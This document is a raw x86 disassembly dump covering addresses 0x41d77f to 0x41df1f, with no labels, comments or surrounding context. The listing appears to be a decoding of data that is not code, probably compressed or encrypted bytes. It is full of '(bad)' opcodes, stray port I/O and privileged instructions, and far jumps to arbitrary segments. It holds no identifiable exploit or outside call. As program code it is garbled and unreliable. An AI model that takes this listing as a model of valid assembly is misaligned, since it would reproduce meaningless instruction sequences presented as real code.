  41d77f:	mov    al,0xe0
  41d781:	div    BYTE PTR [ebx+0x22b62759]
  41d787:	and    esi,ebp
  41d789:	jns    0x41d713
  41d78b:	mov    ah,0x64
  41d78d:	xchg   esp,eax
  41d78e:	loop   0x41d7d4
  41d790:	sub    BYTE PTR [esi+0x74e32400],ch
  41d796:	rol    bl,0x94
  41d799:	and    ah,cl
  41d79b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d79c:	pop    es
  41d79d:	and    BYTE PTR [eax+ebp*2-0x44],bh
  41d7a1:	or     al,dl
  41d7a3:	in     al,dx
  41d7a4:	fidiv  WORD PTR [ebx+edx*1]
  41d7a7:	aam    0xda
  41d7a9:	sub    dl,dl
  41d7ab:	aas    
  41d7ac:	fnstcw WORD PTR [ebp-0x780d16d8]
  41d7b2:	xchg   DWORD PTR ds:0x7ce80afa,eax
  41d7b9:	lahf   
  41d7ba:	in     al,dx
  41d7bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7bc:	and    ecx,DWORD PTR [edi-0x4f]
  41d7bf:	xor    eax,0xb3e2a6bc
  41d7c4:	hlt    
  41d7c5:	inc    ecx
  41d7c6:	mov    dl,0xfa
  41d7c8:	push   ss
  41d7c9:	sbb    al,0x22
  41d7cb:	inc    ebp
  41d7cc:	fcomp  QWORD PTR ds:0xffe42b2
  41d7d2:	jecxz  0x41d767
  41d7d4:	pop    ebp
  41d7d5:	clc    
  41d7d6:	cld    
  41d7d7:	and    eax,0xa7fdae95
  41d7dc:	into   
  41d7dd:	and    eax,0x4854e01a
  41d7e2:	mov    al,ds:0x6e64558a
  41d7e7:	out    0xd1,al
  41d7e9:	adc    esp,edx
  41d7eb:	jo     0x41d846
  41d7ed:	mov    al,ds:0x57806c0f
  41d7f2:	fs test eax,0x8ce419e1
  41d7f8:	into   
  41d7f9:	add    eax,0xc6c2c65d
  41d7fe:	mov    ds,WORD PTR [ebx-0x74]
  41d801:	or     BYTE PTR [eax-0x54eca4a6],bh
  41d807:	xchg   esp,eax
  41d808:	adc    BYTE PTR [edi-0x50a23279],0x4b
  41d80f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d810:	mov    dl,0xa4
  41d812:	bound  ebp,QWORD PTR ds:0x678606d6
  41d818:	push   edx
  41d819:	cmp    al,0xf7
  41d81b:	fs dec ebx
  41d81d:	or     DWORD PTR [ebx-0x5e],ebp
  41d820:	mov    ebp,0xbc266302
  41d825:	cmp    edi,ebp
  41d827:	dec    edx
  41d828:	jge    0x41d7b8
  41d82a:	adc    DWORD PTR ds:0x4be340dc,eax
  41d830:	jecxz  0x41d800
  41d832:	dec    ebp
  41d833:	repnz xor dl,BYTE PTR ds:0x35e52dc7
  41d83a:	pushf  
  41d83b:	mov    dh,0x40
  41d83d:	mov    cl,0xa
  41d83f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d840:	arpl   WORD PTR [ebx-0x7],bp
  41d843:	add    BYTE PTR [edx],bl
  41d845:	mov    ebp,0x14a12a61
  41d84a:	pushf  
  41d84b:	dec    ebx
  41d84c:	push   ebx
  41d84d:	or     al,BYTE PTR [eax+0x21]
  41d850:	or     al,0x4c
  41d852:	add    eax,0x7b45c017
  41d857:	inc    ebp
  41d858:	outs   dx,BYTE PTR ds:[esi]
  41d859:	sub    ah,dl
  41d85b:	outs   dx,DWORD PTR ds:[esi]
  41d85c:	xchg   BYTE PTR [eax],cl
  41d85e:	shl    DWORD PTR [esi-0x5b7752b],cl
  41d864:	adc    eax,0xd94b7804
  41d869:	es inc esp
  41d86b:	mov    bh,0xf7
  41d86d:	push   cs
  41d86e:	and    eax,0x6aa2be4f
  41d873:	add    ebp,DWORD PTR es:[edi+0x2a3e9df2]
  41d87a:	ds mov dh,0xe6
  41d87d:	fs mov bl,0x7f
  41d880:	and    dh,BYTE PTR [ecx]
  41d882:	lds    edx,FWORD PTR [edx+0x11]
  41d885:	addr16 repnz test al,0xc6
  41d889:	or     al,0x1f
  41d88b:	imul   eax,DWORD PTR [esp+eax*1+0x8],0x32e71f26
  41d893:	rcl    BYTE PTR [eax+0x74bf042c],1
  41d899:	pushf  
  41d89a:	mov    al,0x76
  41d89c:	or     edi,DWORD PTR [eax-0x5e]
  41d89f:	mov    al,0x48
  41d8a1:	repz mov esi,cs
  41d8a4:	adc    edi,ebp
  41d8a6:	jnp    0x41d82f
  41d8a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8a9:	paddd  mm6,QWORD PTR [eax-0x17160762]
  41d8b0:	push   0x82382b66
  41d8b5:	push   ecx
  41d8b6:	stos   BYTE PTR es:[edi],al
  41d8b7:	mov    ecx,0x89ffef2f
  41d8bc:	inc    esp
  41d8bd:	or     ebp,DWORD PTR [edx+0x1e]
  41d8c0:	popf   
  41d8c1:	and    eax,0x106bbac1
  41d8c6:	jmp    0x41d919
  41d8c8:	and    al,0xd2
  41d8ca:	inc    ecx
  41d8cb:	gs push eax
  41d8cd:	repz push esi
  41d8cf:	inc    esp
  41d8d0:	mul    ebp
  41d8d2:	pop    edx
  41d8d3:	fs dec ebp
  41d8d5:	add    DWORD PTR [ecx-0x18c18587],esi
  41d8db:	xor    al,0x48
  41d8dd:	mov    WORD PTR [edi-0x5a],cs
  41d8e0:	xor    eax,0x77610a2f
  41d8e5:	xchg   bh,bh
  41d8e7:	(bad)  
  41d8e8:	data16 mov dl,0xa6
  41d8eb:	pop    ebx
  41d8ec:	into   
  41d8ed:	add    al,0xe2
  41d8ef:	dec    eax
  41d8f0:	dec    edi
  41d8f1:	sub    dl,BYTE PTR [edx+ebx*8+0x43]
  41d8f5:	gs (bad) 
  41d8f7:	ja     0x41d88c
  41d8f9:	ror    BYTE PTR [ebp+0x40a193ac],0x48
  41d900:	dec    esp
  41d901:	xor    DWORD PTR [esi],edx
  41d903:	mov    ch,0x64
  41d905:	aad    0xbc
  41d907:	adc    DWORD PTR [ecx],0xffffff88
  41d90a:	dec    ebp
  41d90b:	push   ds
  41d90c:	jbe    0x41d8ad
  41d90e:	std    
  41d90f:	and    al,BYTE PTR [eax-0x61172552]
  41d915:	cli    
  41d916:	adc    al,0x99
  41d918:	es mov ebx,0x2ba01640
  41d91e:	adc    al,0xc9
  41d920:	ins    DWORD PTR es:[edi],dx
  41d921:	popf   
  41d922:	cmp    eax,edx
  41d924:	push   edx
  41d925:	xchg   BYTE PTR ss:0xa475e9a7,bl
  41d92c:	cmp    eax,0x2d952a5b
  41d931:	fild   DWORD PTR [ebx-0x64]
  41d934:	jne    0x41d935
  41d936:	jmp    0x41d8d2
  41d938:	pop    esp
  41d939:	in     eax,0x1c
  41d93b:	inc    ecx
  41d93c:	mov    ebp,DWORD PTR [ecx-0x64415f77]
  41d942:	aam    0x9a
  41d944:	pop    eax
  41d945:	adc    eax,0x48fc0645
  41d94a:	dec    ecx
  41d94b:	imul   esp,DWORD PTR [esi+0x57],0x229a30ba
  41d952:	cld    
  41d953:	outs   dx,BYTE PTR ds:[esi]
  41d954:	cmp    BYTE PTR [edx-0x2a],ch
  41d957:	lds    edx,FWORD PTR [eax-0x7e]
  41d95a:	(bad)  
  41d95b:	push   edi
  41d95c:	ret    0x85d3
  41d95f:	popf   
  41d960:	xor    DWORD PTR [ebx+0x3f],esi
  41d963:	sbb    al,0x54
  41d965:	and    BYTE PTR [ebp-0x1c8373d9],0xbb
  41d96c:	jge    0x41d96a
  41d96e:	in     al,0xcc
  41d970:	ins    DWORD PTR es:[edi],dx
  41d971:	rcr    esp,cl
  41d973:	sbb    DWORD PTR [ecx+0x6dc4ce26],ebp
  41d979:	ins    BYTE PTR es:[edi],dx
  41d97a:	cmp    eax,DWORD PTR [edi+0x7e]
  41d97d:	dec    ebp
  41d97e:	enter  0x917a,0xce
  41d982:	inc    ebp
  41d983:	lods   eax,DWORD PTR ds:[esi]
  41d984:	xchg   ebp,eax
  41d985:	sbb    ebp,edx
  41d987:	inc    ecx
  41d988:	in     al,dx
  41d989:	jmp    0x813f:0x26211284
  41d990:	and    ebp,DWORD PTR [esi+0x56]
  41d993:	popa   
  41d994:	arpl   WORD PTR [ebx+0x26b40d0],dx
  41d99a:	shl    bl,0x5e
  41d99d:	out    dx,eax
  41d99e:	psubd  mm5,QWORD PTR [ebp-0x72835ba8]
  41d9a5:	lock (bad) 
  41d9a7:	jmp    0x41da03
  41d9a9:	mov    ebx,0x4898ce23
  41d9ae:	int3   
  41d9af:	xchg   edx,eax
  41d9b0:	or     BYTE PTR [edi],ah
  41d9b2:	jmp    0xb4d1c1cf
  41d9b7:	jnp    0x41d945
  41d9b9:	sub    DWORD PTR [ecx-0xf702585],edi
  41d9bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9c0:	in     eax,dx
  41d9c1:	jnp    0x41d94a
  41d9c3:	mov    eax,ds:0x9ffa983e
  41d9c8:	or     DWORD PTR [edx+0x77df243a],ebp
  41d9ce:	xchg   esi,eax
  41d9cf:	dec    eax
  41d9d0:	pop    es
  41d9d1:	or     bl,dl
  41d9d3:	imul   ecx
  41d9d5:	sub    cl,bl
  41d9d7:	arpl   WORD PTR [ebx+0x4f],si
  41d9da:	ins    DWORD PTR es:[edi],dx
  41d9db:	inc    esi
  41d9dc:	dec    ebp
  41d9dd:	(bad)
  41d9e1:	fadd   st(4),st
  41d9e3:	or     dl,BYTE PTR [edi+ebp*4]
  41d9e6:	adc    esp,DWORD PTR [esi+eiz*1]
  41d9e9:	jmp    0x33b1:0x310b872c
  41d9f0:	cld    
  41d9f1:	push   0xd4a9e1ec
  41d9f6:	and    DWORD PTR [ecx-0xe],ebx
  41d9f9:	outs   dx,DWORD PTR ds:[esi]
  41d9fa:	lds    eax,FWORD PTR [esp+eiz*8]
  41d9fd:	mov    dh,0xe4
  41d9ff:	jp     0x41da6f
  41da01:	scas   al,BYTE PTR es:[edi]
  41da02:	bnd ja 0x41da45
  41da05:	mov    ebx,0x130d68cc
  41da0a:	shl    DWORD PTR [ebx+0x2b507abe],1
  41da10:	dec    ecx
  41da11:	shl    BYTE PTR [ebx],1
  41da13:	jg     0x41da60
  41da15:	xor    al,0x5d
  41da17:	cmp    ecx,DWORD PTR [edx-0xb]
  41da1a:	in     al,dx
  41da1b:	ror    edi,1
  41da1d:	cmp    edi,ebp
  41da1f:	outs   dx,DWORD PTR ds:[esi]
  41da20:	fidiv  WORD PTR [ebx+0x3ca1c552]
  41da26:	fs jbe 0x41d9fb
  41da29:	jbe    0x41da9e
  41da2b:	in     eax,dx
  41da2c:	arpl   cx,cx
  41da2e:	mov    ah,0x71
  41da30:	clc    
  41da31:	or     DWORD PTR [ecx-0x329f66d],0x4e
  41da38:	jecxz  0x41da73
  41da3a:	xor    DWORD PTR [ecx+edx*4+0x9],edx
  41da3e:	jo     0x41d9ce
  41da40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da41:	cwde   
  41da42:	idiv   BYTE PTR [ecx]
  41da44:	add    BYTE PTR [edx+0x57db6361],bl
  41da4a:	popa   
  41da4b:	jbe    0x41da7e
  41da4d:	xor    esi,DWORD PTR [esi-0x40082d06]
  41da53:	sbb    BYTE PTR [ebp+0x67],cl
  41da56:	adc    DWORD PTR [eax+ebx*2],ebp
  41da59:	cs test eax,0x8da41360
  41da5f:	and    esp,eax
  41da61:	sbb    BYTE PTR cs:[esi-0x2c],bh
  41da65:	std    
  41da66:	jne    0x41dab0
  41da68:	retw   0x53ae
  41da6c:	sbb    DWORD PTR [ebx+0x34],edi
  41da6f:	cld    
  41da70:	mov    ?,WORD PTR [eax+eiz*1-0x2bdc335b]
  41da77:	xor    BYTE PTR ds:0xa1a3f77f,dh
  41da7d:	outs   dx,BYTE PTR ds:[esi]
  41da7e:	test   al,0x1b
  41da80:	sub    esi,DWORD PTR [ebx+ebx*2+0x5861397]
  41da87:	xchg   edi,eax
  41da88:	jbe    0x41da80
  41da8a:	jecxz  0x41daca
  41da8c:	fisub  DWORD PTR [ecx+eiz*1+0x5d8038d4]
  41da93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da94:	add    BYTE PTR [edx-0x7bac2193],0x40
  41da9b:	adc    edi,esp
  41da9d:	sub    eax,0x877bbf
  41daa2:	adc    bl,dh
  41daa4:	aas    
  41daa5:	xor    eax,0x1f6b0554
  41daaa:	push   0x62a0bc95
  41daaf:	mov    ds:0x2bc01d89,al
  41dab4:	cdq    
  41dab5:	xchg   ebp,eax
  41dab6:	lock push ss
  41dab8:	cwde   
  41dab9:	(bad)  
  41daba:	ss pop ss
  41dabc:	mov    bh,0x5c
  41dabe:	sbb    cl,ch
  41dac0:	add    DWORD PTR [ebx-0x1e002e4d],edx
  41dac6:	jecxz  0x41da6c
  41dac8:	(bad)  
  41dac9:	test   eax,0x2d6b57c4
  41dace:	fwait
  41dacf:	ret    0x9396
  41dad2:	scas   al,BYTE PTR es:[edi]
  41dad3:	dec    bp
  41dad5:	sti    
  41dad6:	sbb    DWORD PTR [edi-0x70],ecx
  41dad9:	cmc    
  41dada:	mov    BYTE PTR [ecx-0x7cbb8d66],dh
  41dae0:	cmc    
  41dae1:	add    edi,DWORD PTR [ebx]
  41dae3:	fcmovu st,st(5)
  41dae5:	push   0x5e
  41dae7:	push   es
  41dae8:	mov    DWORD PTR [eax+0x282c14c6],edx
  41daee:	data16 mov al,ds:0xa69992b8
  41daf4:	mov    esi,0x47ee6471
  41daf9:	cmp    al,0x84
  41dafb:	xor    al,0x53
  41dafd:	push   0x36843ee7
  41db02:	into   
  41db03:	int    0x22
  41db05:	cmp    al,0x3d
  41db07:	clc    
  41db08:	and    esp,ebx
  41db0a:	iret   
  41db0b:	mov    esi,esp
  41db0d:	adc    al,0x30
  41db0f:	adc    dl,ah
  41db11:	mov    edi,0x58ea27f3
  41db16:	popf   
  41db17:	jecxz  0x41db54
  41db19:	cld    
  41db1a:	enter  0x4355,0x25
  41db1e:	lods   eax,DWORD PTR ds:[esi]
  41db1f:	or     esp,DWORD PTR [eax+0x5a28f8b9]
  41db25:	aas    
  41db26:	mov    ds:0x30b280ac,eax
  41db2b:	lods   eax,DWORD PTR ds:[esi]
  41db2c:	adc    DWORD PTR [ecx-0x5e],eax
  41db2f:	(bad)  
  41db31:	jae    0x41db26
  41db33:	out    dx,eax
  41db34:	mov    eax,0xe348acfc
  41db39:	imul   edi,ecx,0x328c8c44
  41db3f:	rcr    DWORD PTR [esi-0x12289791],0xab
  41db46:	in     al,dx
  41db47:	inc    edi
  41db48:	mov    al,cs:0x4319f2a8
  41db4e:	push   es
  41db4f:	pop    ecx
  41db50:	inc    ebp
  41db51:	call   0xeaae5108
  41db56:	push   esi
  41db57:	dec    ebx
  41db58:	mov    BYTE PTR [edi-0x6e],bl
  41db5b:	adc    ebp,DWORD PTR [edi]
  41db5d:	cmp    al,dh
  41db5f:	aam    0x13
  41db61:	xchg   ch,al
  41db63:	out    dx,eax
  41db64:	inc    eax
  41db65:	pop    edi
  41db66:	adc    eax,0x444db857
  41db6b:	pushf  
  41db6c:	inc    ebp
  41db6d:	push   0x99d1b3
  41db72:	xor    DWORD PTR [eax+0x626551db],edx
  41db78:	xlat   BYTE PTR ds:[ebx]
  41db79:	push   cs
  41db7a:	jnp    0x41db13
  41db7c:	push   0xffffffef
  41db7e:	sbb    al,0x3b
  41db80:	mov    ebp,0xd9b144b1
  41db85:	retf   
  41db86:	loop   0x41dbb1
  41db88:	ret    0x4316
  41db8b:	lods   al,BYTE PTR ds:[esi]
  41db8c:	rcl    ebp,0xe7
  41db8f:	mov    esp,0xbafe593d
  41db94:	pop    ss
  41db95:	jp     0x41dbe7
  41db97:	test   BYTE PTR [ebp-0x4fc15ea8],bl
  41db9d:	xor    ch,bl
  41db9f:	cmc    
  41dba0:	add    DWORD PTR [ebp+0x3f607c2f],ebx
  41dba6:	mov    WORD PTR [ecx],fs
  41dba8:	scas   eax,DWORD PTR es:[edi]
  41dba9:	les    ebx,FWORD PTR [eax-0x611c5db2]
  41dbaf:	ret    0x798a
  41dbb2:	jnp    0x41dbdc
  41dbb4:	test   eax,0x4be8989c
  41dbb9:	mov    dl,0xdd
  41dbbb:	out    0x6e,al
  41dbbd:	cwde   
  41dbbe:	push   eax
  41dbbf:	cmp    dl,BYTE PTR [eax+0x40]
  41dbc2:	repz cmp al,0x21
  41dbc5:	mov    WORD PTR [edi+0x2bb54536],?
  41dbcb:	sub    al,0x54
  41dbcd:	mov    ah,bl
  41dbcf:	arpl   WORD PTR [edi+eax*4-0x6e],ax
  41dbd3:	mov    eax,0x50835913
  41dbd8:	adc    BYTE PTR [ebp+eiz*4+0x19],0x44
  41dbdd:	mov    ah,0x9d
  41dbdf:	mov    ds:0xbc94f05d,al
  41dbe4:	adc    eax,0xaca13c51
  41dbe9:	xchg   esp,eax
  41dbea:	rcr    DWORD PTR [eax-0x46],1
  41dbed:	xlat   BYTE PTR ds:[ebx]
  41dbee:	test   BYTE PTR [ebx],dl
  41dbf0:	mov    BYTE PTR [di+0x2a],ah
  41dbf4:	enter  0xc84c,0x9b
  41dbf8:	test   eax,0x96a2c0e
  41dbfd:	pushf  
  41dbfe:	add    al,0x5f
  41dc00:	lds    edx,FWORD PTR [edi+ebx*1+0x4]
  41dc04:	pop    esp
  41dc05:	jo     0x41dc7d
  41dc07:	pop    ss
  41dc08:	xor    ebp,esp
  41dc0a:	loope  0x41dc02
  41dc0c:	mov    cl,0xc3
  41dc0e:	pop    ecx
  41dc0f:	or     eax,0x4ae6dea3
  41dc14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc15:	jmp    0xe127:0x9b1dc0a8
  41dc1c:	fsubr  QWORD PTR [ebx]
  41dc1e:	jnp    0x41dc90
  41dc20:	test   DWORD PTR [edx-0x78],esi
  41dc23:	mov    cl,cl
  41dc25:	ja     0x41dbe5
  41dc27:	or     ecx,edi
  41dc29:	jo     0x41dc69
  41dc2b:	ins    DWORD PTR es:[edi],dx
  41dc2c:	mov    cs,edx
  41dc2e:	daa    
  41dc2f:	adc    ch,0xa0
  41dc32:	(bad)  
  41dc33:	neg    ch
  41dc35:	bound  esi,QWORD PTR [edx-0x34]
  41dc38:	(bad)  
  41dc39:	in     eax,dx
  41dc3a:	pop    esp
  41dc3b:	push   cs
  41dc3c:	mov    ebp,0xfbc29c7b
  41dc41:	jle    0x41dcb4
  41dc43:	lods   eax,DWORD PTR ds:[esi]
  41dc44:	lahf   
  41dc45:	or     al,BYTE PTR [ecx-0x2]
  41dc48:	fs jo  0x41dc24
  41dc4b:	dec    edi
  41dc4c:	sub    DWORD PTR [edi+0x6e2e36f],0xffffffe2
  41dc53:	arpl   WORD PTR [esi+0x6b923439],dx
  41dc59:	mov    ch,0xf1
  41dc5b:	jnp    0x41dcc6
  41dc5d:	retf   
  41dc5e:	std    
  41dc5f:	rol    DWORD PTR [edi-0x541f878c],cl
  41dc65:	xchg   esi,eax
  41dc66:	xchg   ecx,eax
  41dc67:	mov    ebx,0x5e75ee41
  41dc6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc6d:	mov    bl,0x24
  41dc6f:	std    
  41dc70:	push   0xdbfe9066
  41dc75:	sub    BYTE PTR [esi-0x6a4ea37a],0x6c
  41dc7c:	inc    esp
  41dc7d:	ret    
  41dc7e:	jg     0x41dc3b
  41dc80:	sbb    eax,0xbe8e925c
  41dc85:	test   al,0x69
  41dc87:	sub    bl,BYTE PTR [ecx-0x5c7f7c5f]
  41dc8d:	in     al,dx
  41dc8e:	cs cmp ecx,esi
  41dc91:	jp     0x41dc9e
  41dc93:	sahf   
  41dc94:	push   cs
  41dc95:	mov    dh,0xfe
  41dc97:	int    0xb1
  41dc99:	jg     0x41dc37
  41dc9b:	ins    BYTE PTR es:[edi],dx
  41dc9c:	imul   BYTE PTR [edx-0x7879ef7b]
  41dca2:	dec    ebx
  41dca3:	in     eax,0x22
  41dca5:	cmp    bh,BYTE PTR [eax]
  41dca7:	lods   eax,DWORD PTR ds:[esi]
  41dca8:	dec    ebx
  41dca9:	mov    edi,0xffcc3e0d
  41dcae:	cmp    esp,DWORD PTR [edx-0x40befab2]
  41dcb4:	xchg   esp,eax
  41dcb5:	pop    esi
  41dcb6:	cmpxchg DWORD PTR [ebx+edi*2+0x18c1ca4d],edi
  41dcbe:	std    
  41dcbf:	sbb    BYTE PTR [edx+0x62d31ae],bl
  41dcc5:	ret    0xdc93
  41dcc8:	std    
  41dcc9:	pop    ss
  41dcca:	adc    al,0x25
  41dccc:	jge    0x41dd4b
  41dcce:	inc    edi
  41dccf:	adc    al,0x67
  41dcd1:	sbb    BYTE PTR [esi-0x7a],bl
  41dcd4:	dec    eax
  41dcd5:	bound  esp,QWORD PTR [edi+0x27a6e736]
  41dcdb:	pop    esi
  41dcdc:	scas   eax,DWORD PTR es:[edi]
  41dcdd:	push   ebp
  41dcde:	inc    edx
  41dcdf:	xchg   ebx,eax
  41dce0:	mov    cs,eax
  41dce2:	pop    ss
  41dce3:	inc    edx
  41dce4:	enter  0xd83f,0x7
  41dce8:	mov    cl,BYTE PTR [esi-0x5539befd]
  41dcee:	addr16 adc di,cx
  41dcf2:	mov    BYTE PTR [eax-0x4],bh
  41dcf5:	sub    DWORD PTR [ecx+0x41],esi
  41dcf8:	pop    ss
  41dcf9:	jl     0x41dcc7
  41dcfb:	jecxz  0x41dd64
  41dcfd:	xchg   edi,eax
  41dcfe:	cmp    BYTE PTR [ebx+ebp*4],dl
  41dd01:	xchg   BYTE PTR [eax+0x7c],dl
  41dd04:	cli    
  41dd05:	and    al,0xcd
  41dd07:	inc    ecx
  41dd08:	pop    ecx
  41dd09:	aaa    
  41dd0a:	repz add al,0x90
  41dd0d:	mov    eax,0xc05efedc
  41dd12:	out    dx,eax
  41dd13:	push   edi
  41dd14:	push   ss
  41dd15:	int    0x9
  41dd17:	scas   eax,DWORD PTR es:[edi]
  41dd18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd19:	sub    ah,BYTE PTR [ebp-0x18]
  41dd1c:	sti    
  41dd1d:	mov    BYTE PTR [ecx],bl
  41dd1f:	inc    edi
  41dd20:	scas   al,BYTE PTR es:[edi]
  41dd21:	xlat   BYTE PTR ds:[ebx]
  41dd22:	ins    BYTE PTR es:[edi],dx
  41dd23:	sub    BYTE PTR [ecx-0x4edbd361],dl
  41dd29:	adc    DWORD PTR [edx+edx*8-0x5ed84985],0xfffffff6
  41dd31:	xor    DWORD PTR [ebx+0x4f8e39cd],ebx
  41dd37:	in     al,0x3c
  41dd39:	mov    cl,0x6d
  41dd3b:	bt     DWORD PTR [ecx-0x4d],0xf2
  41dd40:	aas    
  41dd41:	or     al,0x7
  41dd43:	or     ecx,esi
  41dd45:	jge    0x41dd31
  41dd47:	shl    bh,cl
  41dd49:	es ret 0xef7
  41dd4d:	ds dec eax
  41dd4f:	popa   
  41dd50:	cmp    ecx,DWORD PTR [edi+eiz*1-0x2e4ce1fa]
  41dd57:	leave  
  41dd58:	push   0xc64327b4
  41dd5d:	mov    edi,es
  41dd5f:	popf   
  41dd60:	mov    al,ds:0x71883f92
  41dd65:	popf   
  41dd66:	mov    DWORD PTR ds:0x6c188153,ecx
  41dd6c:	(bad)  
  41dd6d:	mov    eax,0xf6e27582
  41dd72:	cdq    
  41dd73:	and    BYTE PTR [ebp-0x1b8901b0],ch
  41dd79:	adc    DWORD PTR [ebx+0x7744a0b],eax
  41dd7f:	sub    DWORD PTR [ecx-0x3805bf8f],ecx
  41dd85:	shl    dh,0xd5
  41dd88:	xchg   ebp,eax
  41dd89:	test   eax,0x39535db4
  41dd8e:	pusha  
  41dd8f:	mov    ebx,0xf040e127
  41dd94:	fisub  DWORD PTR [edx*8+0x329e78a5]
  41dd9b:	(bad)  
  41dd9c:	push   edi
  41dd9d:	cmp    BYTE PTR [ecx+ebp*8-0x65],dh
  41dda1:	pop    ss
  41dda2:	xchg   edi,eax
  41dda3:	jbe    0x41dd51
  41dda5:	ret    0xf977
  41dda8:	cwde   
  41dda9:	aas    
  41ddaa:	or     BYTE PTR [edi-0x70],cl
  41ddad:	push   edx
  41ddae:	mov    al,ds:0x8a36e063
  41ddb3:	lods   eax,DWORD PTR ds:[esi]
  41ddb4:	mov    al,ds:0x8b7588fa
  41ddb9:	push   ebx
  41ddba:	jno    0x41ddc4
  41ddbc:	test   edx,ebx
  41ddbe:	mov    dl,0xdb
  41ddc0:	popf   
  41ddc1:	cmp    eax,0xd56c9380
  41ddc6:	push   cs
  41ddc7:	loope  0x41ddfc
  41ddc9:	jmp    0x8f2f:0x693af266
  41ddd0:	jo     0x41dda0
  41ddd2:	gs aaa 
  41ddd4:	pop    eax
  41ddd5:	frstor [edx-0x21b49b45]
  41dddb:	xchg   WORD PTR [esi+0x20087809],sp
  41dde2:	mov    dh,0xf1
  41dde4:	in     eax,dx
  41dde5:	mov    ch,BYTE PTR [ecx-0x27]
  41dde8:	inc    esi
  41dde9:	xchg   esi,eax
  41ddea:	mov    bl,0x62
  41ddec:	adc    bl,BYTE PTR [eax-0x25]
  41ddef:	aas    
  41ddf0:	dec    edx
  41ddf1:	enter  0xe33b,0x9b
  41ddf5:	ficom  WORD PTR [eax-0x18f40ff7]
  41ddfb:	and    edi,DWORD PTR [edi-0x79820b68]
  41de01:	sub    ebx,DWORD PTR [esi]
  41de03:	stos   DWORD PTR es:[edi],eax
  41de04:	inc    edi
  41de05:	or     eax,0xae56ced9
  41de0a:	mov    ch,0xf9
  41de0c:	and    ch,BYTE PTR [ebp-0x49a1bf82]
  41de12:	mov    ds:0x7fa0afe9,al
  41de17:	pop    ds
  41de18:	xlat   BYTE PTR ds:[ebx]
  41de19:	and    ah,BYTE PTR [eax-0x35eaa89f]
  41de1f:	mov    ds:0xb7e32cdd,eax
  41de24:	pop    ss
  41de25:	push   es
  41de26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de27:	cmc    
  41de28:	test   eax,0x8255df63
  41de2d:	xchg   DWORD PTR [esi-0x668f05f],eax
  41de33:	sti    
  41de34:	xlat   BYTE PTR ds:[ebx]
  41de35:	pop    esi
  41de36:	sub    DWORD PTR [edi+0x69],esi
  41de39:	jmp    0x1e26:0x82ae4977
  41de40:	int    0xcc
  41de42:	popa   
  41de43:	cdq    
  41de44:	adc    BYTE PTR [edx+ecx*8-0x5a],bl
  41de48:	jnp    0x41de62
  41de4a:	out    dx,al
  41de4b:	jge    0x41de85
  41de4d:	retf   0x5c6c
  41de50:	aad    0x83
  41de52:	mov    ecx,0x61cbeb11
  41de57:	bound  ebx,QWORD PTR [edx-0x5c]
  41de5a:	gs cmp eax,0xcbd9e533
  41de60:	mov    bh,0x24
  41de62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de63:	test   WORD PTR [ebp+0x3abcbea0],0x9246
  41de6c:	jecxz  0x41de1c
  41de6e:	mov    edx,0x94803226
  41de73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de74:	test   DWORD PTR [ebp+0x23],0xf89cb890
  41de7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de7c:	pop    ds
  41de7d:	fst    QWORD PTR [ebp-0x6]
  41de80:	popf   
  41de81:	mov    cl,cl
  41de83:	mov    ecx,0xfe83b2c9
  41de88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de89:	aas    
  41de8a:	push   ebp
  41de8b:	mov    ds:0xbf46e0a4,al
  41de90:	inc    edi
  41de91:	mov    BYTE PTR [ecx-0x44],ch
  41de94:	lea    esi,[edx-0x4]
  41de97:	push   ds
  41de98:	push   0x4f
  41de9a:	mov    al,0x96
  41de9c:	push   0xffffffa2
  41de9e:	cdq    
  41de9f:	sahf   
  41dea0:	xchg   edi,eax
  41dea1:	cmovp  ebx,DWORD PTR [eax+0x62e8b457]
  41dea8:	xor    eax,0x52d9cc78
  41dead:	pop    ds
  41deae:	sub    al,0x6f
  41deb0:	fadd   st(7),st
  41deb2:	loopne 0x41df0a
  41deb4:	xchg   esi,eax
  41deb5:	pushf  
  41deb6:	and    eax,0x13887f5b
  41debb:	retf   0x7262
  41debe:	jp     0x41def3
  41dec0:	int3   
  41dec1:	cmp    ah,bh
  41dec3:	push   ecx
  41dec4:	dec    ebp
  41dec5:	add    al,0xd6
  41dec7:	jmp    DWORD PTR ss:[ebx+0x30]
  41decb:	fbstp  TBYTE PTR [ebx+0x7e192cc2]
  41ded1:	std    
  41ded2:	jecxz  0x41dea7
  41ded4:	cmp    ebp,edi
  41ded6:	adc    DWORD PTR [eax],ebx
  41ded8:	pop    edx
  41ded9:	sbb    eax,0x20eaae7f
  41dede:	mov    al,ds:0xb9739532
  41dee3:	std    
  41dee4:	pop    esp
  41dee5:	stos   DWORD PTR es:[edi],eax
  41dee6:	jle    0x41de7c
  41dee8:	loopne 0x41dee8
  41deea:	mov    edi,0x8a5c28bb
  41deef:	pop    esi
  41def0:	sub    al,0x42
  41def2:	push   ebp
  41def3:	pop    ebx
  41def4:	idiv   DWORD PTR [ebp+0x2e]
  41def7:	xor    eax,ebx
  41def9:	arpl   dx,cx
  41defb:	mov    dl,0x94
  41defd:	call   0x925e5da8
  41df02:	(bad)  
  41df03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df04:	fistp  DWORD PTR [edi]
  41df06:	adc    al,0xef
  41df08:	xor    DWORD PTR [edx+0x762a341c],esi
  41df0e:	and    dh,BYTE PTR [eax-0x189fb915]
  41df14:	push   es
  41df15:	xor    dh,bh
  41df17:	lods   eax,DWORD PTR ds:[esi]
  41df18:	jmp    0xe566:0x4e0a8fd1
  41df1f:	cmp    DWORD PTR [ecx],esp
